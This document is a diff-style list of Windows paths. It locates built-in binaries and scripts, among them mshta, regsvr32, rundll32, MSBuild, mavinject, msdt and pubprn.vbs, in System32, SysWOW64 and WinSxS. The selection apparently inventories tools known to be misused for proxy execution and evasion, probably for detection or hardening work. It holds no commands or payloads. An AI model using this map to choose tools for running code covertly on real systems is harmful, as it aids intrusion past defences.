+Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.22621.4036_none_9da1f077a23bc9bd\mavinject.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.22621.4036_none_934d46256ddb07c2\f\mavinject.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.22621.4036_none_934d46256ddb07c2\r\mavinject.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.22621.4036_none_9da1f077a23bc9bd\f\mavinject.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.22621.4036_none_9da1f077a23bc9bd\r\mavinject.exe
+Path: C:\Windows\WinSxS\amd64_microsoft.workflow.compiler_31bf3856ad364e35_4.0.15912.0_none_ed62602ac24399fc\Microsoft.Workflow.Compiler.exe
+Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe
+Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
+Path: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Workflow.Compiler\v4.0_4.0.0.0__31bf3856ad364e35\Microsoft.Workflow.Compiler.exe
+Path: C:\Windows\System32\mmc.exe
+Path: C:\Windows\SysWOW64\mmc.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.22621.4317_none_ef643dcdf130bc1f\mmc.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.22621.4317_none_f9b8e82025917e1a\mmc.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.22621.4317_none_ef643dcdf130bc1f\f\mmc.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.22621.4317_none_ef643dcdf130bc1f\r\mmc.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.22621.4317_none_f9b8e82025917e1a\f\mmc.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..-management-console_31bf3856ad364e35_10.0.22621.4317_none_f9b8e82025917e1a\r\mmc.exe
+Path: C:\Windows\WinSxS\amd64_msbuild_b03f5f7f11d50a3a_4.0.15912.0_none_de1bfcc9998a681e\MSBuild.exe
+Path: C:\Windows\WinSxS\wow64_msbuild_b03f5f7f11d50a3a_4.0.15912.0_none_07ea43e35ad4fd3b\MSBuild.exe
+Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe
+Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
+Path: C:\Windows\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe
+Path: C:\Windows\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe
+Path: C:\Windows\System32\msconfig.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.22621.4249_none_ba78d47b1943f14c\msconfig.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.22621.4249_none_ba78d47b1943f14c\f\msconfig.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-msconfig-exe_31bf3856ad364e35_10.0.22621.4249_none_ba78d47b1943f14c\r\msconfig.exe
+Path: C:\Windows\System32\msdt.exe
+Path: C:\Windows\SysWOW64\msdt.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.22621.3672_none_855956aa99276574\msdt.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.22621.3672_none_8fae00fccd88276f\msdt.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.22621.3672_none_855956aa99276574\f\msdt.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-msdt_31bf3856ad364e35_10.0.22621.3672_none_855956aa99276574\r\msdt.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.22621.3672_none_8fae00fccd88276f\f\msdt.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-msdt_31bf3856ad364e35_10.0.22621.3672_none_8fae00fccd88276f\r\msdt.exe
+Path: C:\Windows\System32\mshta.exe
+Path: C:\Windows\SysWOW64\mshta.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.22621.2506_none_7cec68cbae71aeca\mshta.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.22621.2506_none_8741131de2d270c5\mshta.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.22621.2506_none_7cec68cbae71aeca\f\mshta.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.22621.2506_none_7cec68cbae71aeca\r\mshta.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.22621.2506_none_8741131de2d270c5\f\mshta.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-ie-htmlapplication_31bf3856ad364e35_11.0.22621.2506_none_8741131de2d270c5\r\mshta.exe
+Path: C:\Windows\System32\mshtml.dll
+Path: C:\Windows\SysWOW64\mshtml.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.22621.4317_none_35db1abd57595b00\mshtml.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.22621.4317_none_402fc50f8bba1cfb\mshtml.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.22621.4317_none_35db1abd57595b00\f\mshtml.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.22621.4317_none_35db1abd57595b00\r\mshtml.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.22621.4317_none_402fc50f8bba1cfb\f\mshtml.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-i..tmlrendering-legacy_31bf3856ad364e35_11.0.22621.4317_none_402fc50f8bba1cfb\r\mshtml.dll
+Path: C:\Windows\System32\msiexec.exe
+Path: C:\Windows\SysWOW64\msiexec.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.22621.3880_none_2943f78601c9ec92\msiexec.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.22621.3880_none_3398a1d8362aae8d\msiexec.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.22621.3880_none_2943f78601c9ec92\f\msiexec.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.22621.3880_none_2943f78601c9ec92\r\msiexec.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.22621.3880_none_3398a1d8362aae8d\f\msiexec.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-installer-executable_31bf3856ad364e35_10.0.22621.3880_none_3398a1d8362aae8d\r\msiexec.exe
+Path: C:\Windows\System32\netsh.exe
+Path: C:\Windows\SysWOW64\netsh.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-netsh_31bf3856ad364e35_10.0.22621.1_none_c136c1f1eb970291\netsh.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-netsh_31bf3856ad364e35_10.0.22621.1_none_cb8b6c441ff7c48c\netsh.exe
+Path: C:\Windows\System32\odbcconf.exe
+Path: C:\Windows\SysWOW64\odbcconf.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..s-mdac-odbcconf-exe_31bf3856ad364e35_10.0.22621.1_none_6f0ca630e5db6641\odbcconf.exe
+Path: C:\Windows\WinSxS\x86_microsoft-windows-m..s-mdac-odbcconf-exe_31bf3856ad364e35_10.0.22621.1_none_12ee0aad2d7df50b\odbcconf.exe
+Path: C:\Windows\System32\pcalua.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.22621.4249_none_13c51c0b9eaae2e5\pcalua.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.22621.4249_none_13c51c0b9eaae2e5\f\pcalua.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..atibility-assistant_31bf3856ad364e35_10.0.22621.4249_none_13c51c0b9eaae2e5\r\pcalua.exe
+Path: C:\Windows\System32\pcwrun.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.22621.3672_none_d502c29b7b490049\pcwrun.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.22621.3672_none_d502c29b7b490049\f\pcwrun.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.22621.3672_none_d502c29b7b490049\r\pcwrun.exe
+Path: C:\Windows\System32\pcwutl.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.22621.3672_none_d502c29b7b490049\pcwutl.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.22621.3672_none_d502c29b7b490049\f\pcwutl.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-pcwdiagnostic_31bf3856ad364e35_10.0.22621.3672_none_d502c29b7b490049\r\pcwutl.dll
+Path: C:\Windows\WinSxS\amd64_microsoft.powershell.pester_31bf3856ad364e35_10.0.22621.3880_none_b3f4ed5def80e54c\Pester.bat
+Path: C:\Windows\WinSxS\wow64_microsoft.powershell.pester_31bf3856ad364e35_10.0.22621.3880_none_be4997b023e1a747\Pester.bat
+Path: C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
+Path: C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
+Path: C:\Windows\System32\PresentationHost.exe
+Path: C:\Windows\SysWOW64\PresentationHost.exe
+Path: C:\Windows\WinSxS\amd64_wpf-presentationhostexe_31bf3856ad364e35_10.0.22621.1_none_d189ff0513dc0e78\PresentationHost.exe
+Path: C:\Windows\WinSxS\x86_wpf-presentationhostexe_31bf3856ad364e35_10.0.22621.1_none_756b63815b7e9d42\PresentationHost.exe
+Path: C:\Windows\System32\print.exe
+Path: C:\Windows\SysWOW64\print.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.22621.1_none_deb2b95b5b12c4ba\print.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.22621.1_none_e90763ad8f7386b5\print.exe
+Path: C:\Windows\System32\psr.exe
+Path: C:\Windows\SysWOW64\psr.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.22621.4249_none_baf02723c67da3a9\psr.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.22621.4249_none_c544d175fade65a4\psr.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.22621.4249_none_baf02723c67da3a9\f\psr.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.22621.4249_none_baf02723c67da3a9\r\psr.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.22621.4249_none_c544d175fade65a4\f\psr.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-a..roblemstepsrecorder_31bf3856ad364e35_10.0.22621.4249_none_c544d175fade65a4\r\psr.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.22621.1_en-us_70432baa400e82bb\pubprn.vbs
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-p..inscripts.resources_31bf3856ad364e35_10.0.22621.1_en-us_7a97d5fc746f44b6\pubprn.vbs
+Path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
+Path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
+Path: C:\Windows\System32\rasautou.exe
+Path: C:\Windows\SysWOW64\rasautou.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-rasautodial_31bf3856ad364e35_10.0.22621.1_none_716fca6a59114fa2\rasautou.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-rasautodial_31bf3856ad364e35_10.0.22621.1_none_7bc474bc8d72119d\rasautou.exe
+Path: C:\Windows\System32\reg.exe
+Path: C:\Windows\SysWOW64\reg.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-r..-commandline-editor_31bf3856ad364e35_10.0.22621.1_none_9329ffb11e6da924\reg.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-r..-commandline-editor_31bf3856ad364e35_10.0.22621.1_none_9d7eaa0352ce6b1f\reg.exe
+Path: C:\Windows\WinSxS\amd64_regasm_b03f5f7f11d50a3a_4.0.15912.0_none_73fd08cefdd719a5\RegAsm.exe
+Path: C:\Windows\WinSxS\wow64_regasm_b03f5f7f11d50a3a_4.0.15912.0_none_9dcb4fe8bf21aec2\RegAsm.exe
+Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe
+Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe
+Path: C:\Windows\regedit.exe
+Path: C:\Windows\SysWOW64\regedit.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.22621.4249_none_d42d4b5c575c8752\regedit.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.22621.4249_none_de81f5ae8bbd494d\regedit.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.22621.4249_none_d42d4b5c575c8752\f\regedit.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.22621.4249_none_d42d4b5c575c8752\r\regedit.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.22621.4249_none_de81f5ae8bbd494d\f\regedit.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-registry-editor_31bf3856ad364e35_10.0.22621.4249_none_de81f5ae8bbd494d\r\regedit.exe
+Path: C:\Windows\System32\regini.exe
+Path: C:\Windows\SysWOW64\regini.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-regini_31bf3856ad364e35_10.0.22621.1_none_6dec0822ad8f13bd\regini.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-regini_31bf3856ad364e35_10.0.22621.1_none_7840b274e1efd5b8\regini.exe
+Path: C:\Windows\System32\Register-CimProvider.exe
+Path: C:\Windows\SysWOW64\Register-CimProvider.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..ter-cimprovider-exe_31bf3856ad364e35_10.0.22621.1_none_c4df69bddfb4410a\Register-CimProvider.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..ter-cimprovider-exe_31bf3856ad364e35_10.0.22621.1_none_cf34141014150305\Register-CimProvider.exe
+Path: C:\Windows\WinSxS\amd64_regsvcs_b03f5f7f11d50a3a_4.0.15912.0_none_47183375504a1255\RegSvcs.exe
+Path: C:\Windows\WinSxS\x86_regsvcs_b03f5f7f11d50a3a_4.0.15912.0_none_8ec56a4c64c63b5b\RegSvcs.exe
+Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
+Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe
+Path: C:\Windows\System32\regsvr32.exe
+Path: C:\Windows\SysWOW64\regsvr32.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-regsvr32_31bf3856ad364e35_10.0.22621.1_none_d9ece9052341c871\regsvr32.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-regsvr32_31bf3856ad364e35_10.0.22621.1_none_e441935757a28a6c\regsvr32.exe
+Path: C:\Windows\System32\replace.exe
+Path: C:\Windows\SysWOW64\replace.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.22621.1_none_aa21baa549d827ab\replace.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-m..ommandlineutilities_31bf3856ad364e35_10.0.22621.1_none_b47664f77e38e9a6\replace.exe
+Path: C:\Windows\System32\RpcPing.exe
+Path: C:\Windows\SysWOW64\RpcPing.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.22621.1_none_ff4fd9c43476b417\RpcPing.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-rpc-ping_31bf3856ad364e35_10.0.22621.1_none_09a4841668d77612\RpcPing.exe
+Path: C:\Windows\System32\rundll32.exe
+Path: C:\Windows\SysWOW64\rundll32.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.22621.3880_none_b7c7d449269a9cd1\rundll32.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.22621.3880_none_c21c7e9b5afb5ecc\rundll32.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.22621.3880_none_b7c7d449269a9cd1\f\rundll32.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.22621.3880_none_b7c7d449269a9cd1\r\rundll32.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.22621.3880_none_c21c7e9b5afb5ecc\f\rundll32.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.22621.3880_none_c21c7e9b5afb5ecc\r\rundll32.exe
+Path: C:\Windows\System32\runonce.exe
+Path: C:\Windows\SysWOW64\runonce.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.22621.3672_none_f591c9543aa8ddf6\runonce.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.22621.3672_none_ffe673a66f099ff1\runonce.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.22621.3672_none_f591c9543aa8ddf6\f\runonce.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-runonce_31bf3856ad364e35_10.0.22621.3672_none_f591c9543aa8ddf6\r\runonce.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.22621.3672_none_ffe673a66f099ff1\f\runonce.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-runonce_31bf3856ad364e35_10.0.22621.3672_none_ffe673a66f099ff1\r\runonce.exe
+Path: C:\Windows\System32\sc.exe
+Path: C:\Windows\SysWOW64\sc.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-s..llercommandlinetool_31bf3856ad364e35_10.0.22621.1_none_d60406ccc86ae2cf\sc.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-s..llercommandlinetool_31bf3856ad364e35_10.0.22621.1_none_e058b11efccba4ca\sc.exe
+Path: C:\Windows\System32\schtasks.exe
+Path: C:\Windows\SysWOW64\schtasks.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.22621.1_none_ebd54347a9148abf\schtasks.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-sctasks_31bf3856ad364e35_10.0.22621.1_none_f629ed99dd754cba\schtasks.exe
+Path: C:\Windows\System32\ScriptRunner.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\ScriptRunner.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\f\ScriptRunner.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\r\ScriptRunner.exe
+Path: C:\Windows\System32\setupapi.dll
+Path: C:\Windows\SysWOW64\setupapi.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.22621.2506_none_14cfbf4841dd6256\setupapi.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.22621.2506_none_1f24699a763e2451\setupapi.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.22621.2506_none_14cfbf4841dd6256\f\setupapi.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.22621.2506_none_14cfbf4841dd6256\r\setupapi.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.22621.2506_none_1f24699a763e2451\f\setupapi.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-setupapi_31bf3856ad364e35_10.0.22621.2506_none_1f24699a763e2451\r\setupapi.dll
+Path: C:\Windows\System32\shdocvw.dll
+Path: C:\Windows\SysWOW64\shdocvw.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.22621.4249_none_c773837c876a0e8b\shdocvw.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.22621.4249_none_d1c82dcebbcad086\shdocvw.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.22621.4249_none_c773837c876a0e8b\f\shdocvw.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.22621.4249_none_c773837c876a0e8b\r\shdocvw.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.22621.4249_none_d1c82dcebbcad086\f\shdocvw.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-shdocvw_31bf3856ad364e35_10.0.22621.4249_none_d1c82dcebbcad086\r\shdocvw.dll
+Path: C:\Windows\System32\shell32.dll
+Path: C:\Windows\SysWOW64\shell32.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.22621.4249_none_4c27c0d58d7fce7a\shell32.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.22621.4249_none_567c6b27c1e09075\shell32.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.22621.4249_none_4c27c0d58d7fce7a\f\shell32.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-shell32_31bf3856ad364e35_10.0.22621.4249_none_4c27c0d58d7fce7a\r\shell32.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.22621.4249_none_567c6b27c1e09075\f\shell32.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-shell32_31bf3856ad364e35_10.0.22621.4249_none_567c6b27c1e09075\r\shell32.dll
+Path: C:\Windows\System32\slmgr.vbs
+Path: C:\Windows\SysWOW64\slmgr.vbs
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.22621.1_none_a72f11d2b2de8e85\slmgr.vbs
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-security-spp-tools_31bf3856ad364e35_10.0.22621.1_none_b183bc24e73f5080\slmgr.vbs
+Path: C:\Windows\System32\SyncAppvPublishingServer.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\SyncAppvPublishingServer.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\f\SyncAppvPublishingServer.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\r\SyncAppvPublishingServer.exe
+Path: C:\Windows\System32\SyncAppvPublishingServer.vbs
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-a..nagement-appvclient_31bf3856ad364e35_10.0.22621.4036_none_ac85f0f8439b3eb6\SyncAppvPublishingServer.vbs
+Path: C:\Windows\System32\syssetup.dll
+Path: C:\Windows\SysWOW64\syssetup.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-syssetup_31bf3856ad364e35_10.0.22621.1_none_d26657818b74fb99\syssetup.dll
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-syssetup_31bf3856ad364e35_10.0.22621.1_none_dcbb01d3bfd5bd94\syssetup.dll
+Path: C:\Windows\System32\tttracer.exe
+Path: C:\Windows\SysWOW64\tttracer.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.22621.1_none_c5f9d5c001b0df5c\tttracer.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-t..eldebugger-recorder_31bf3856ad364e35_10.0.22621.1_none_d04e80123611a157\tttracer.exe
+Path: C:\Windows\System32\url.dll
+Path: C:\Windows\SysWOW64\url.dll
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-ie-winsockautodialstub_31bf3856ad364e35_11.0.22621.1_none_85b217d2bc626ea6\url.dll
+Path: C:\Windows\WinSxS\x86_microsoft-windows-ie-winsockautodialstub_31bf3856ad364e35_11.0.22621.1_none_29937c4f0404fd70\url.dll
+Path: C:\Windows\WinSxS\amd64_netfx-vb_compiler_b03f5f7f11d50a3a_10.0.22621.615_none_bb1e2ad901b29574\vbc.exe
+Path: C:\Windows\WinSxS\amd64_netfx35linq-vb_compiler_orcas_31bf3856ad364e35_10.0.22621.615_none_f83cea0ab8654552\vbc.exe
+Path: C:\Windows\WinSxS\amd64_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15912.0_none_98d146a6029264ee\vbc.exe
+Path: C:\Windows\WinSxS\amd64_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15912.355_none_8ee5d84e72880b3f\vbc.exe
+Path: C:\Windows\WinSxS\x86_netfx-vb_compiler_b03f5f7f11d50a3a_10.0.22621.615_none_02cb61b0162ebe7a\vbc.exe
+Path: C:\Windows\WinSxS\x86_netfx35linq-vb_compiler_orcas_31bf3856ad364e35_10.0.22621.615_none_9c1e4e870007d41c\vbc.exe
+Path: C:\Windows\WinSxS\x86_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15912.0_none_e07e7d7d170e8df4\vbc.exe
+Path: C:\Windows\WinSxS\x86_netfx4-vbc_exe_b03f5f7f11d50a3a_4.0.15912.355_none_d6930f2587043445\vbc.exe
+Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe
+Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe
+Path: C:\Windows\System32\verclsid.exe
+Path: C:\Windows\SysWOW64\verclsid.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-verclsid_31bf3856ad364e35_10.0.22621.1_none_1d7c9cea07327c5f\verclsid.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-verclsid_31bf3856ad364e35_10.0.22621.1_none_27d1473c3b933e5a\verclsid.exe
+Path: C:\Program Files\Windows Mail\wab.exe
+Path: C:\Program Files (x86)\Windows Mail\wab.exe
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-wab-app_31bf3856ad364e35_10.0.22621.1_none_a43f2934cb50cea1\wab.exe
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-wab-app_31bf3856ad364e35_10.0.22621.1_none_ae93d386ffb1909c\wab.exe
+Path: C:\Windows\System32\winrm.vbs
+Path: C:\Windows\SysWOW64\winrm.vbs
+Path: C:\Windows\WinSxS\amd64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.22621.2506_none_aa3fdaf728a75456\winrm.vbs
+Path: C:\Windows\WinSxS\wow64_microsoft-windows-w..for-management-core_31bf3856ad364e35_10.0.22621.2506_none_b49485495d081651\winrm.vbs
+Path: C:\Windows\System32\wbem\WMIC.exe
+Path: C:\Windows\SysWOW64\wbem\WMIC.exe
